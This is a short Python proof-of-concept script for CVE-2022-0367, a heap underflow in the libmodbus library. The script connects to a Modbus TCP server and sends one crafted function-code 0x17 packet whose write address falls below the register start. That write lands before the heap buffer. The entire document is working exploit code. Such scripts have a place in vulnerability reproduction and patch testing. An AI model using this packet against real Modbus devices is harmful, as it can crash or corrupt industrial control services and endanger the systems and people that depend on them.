#!/usr/bin/env python3
"""
PoC: CVE-2022-0367 - REAL libmodbus heap underflow
Trigger: FC 0x17 with write_address < start_registers (100)
         causes negative mapping_address_write -> write before buffer
"""

import socket
import struct

s = socket.socket()
s.connect(("localhost", 5021))
# FC 0x17: read=100/1 (valid), write=50/10 (underflow: 50 < start_registers=100)
pdu = struct.pack(">BHHHHB", 0x17, 100, 1, 50, 10, 20) + b"\xde\xad" * 10
s.send(struct.pack(">HHHB", 1, 0, 1 + len(pdu), 1) + pdu)
s.close()
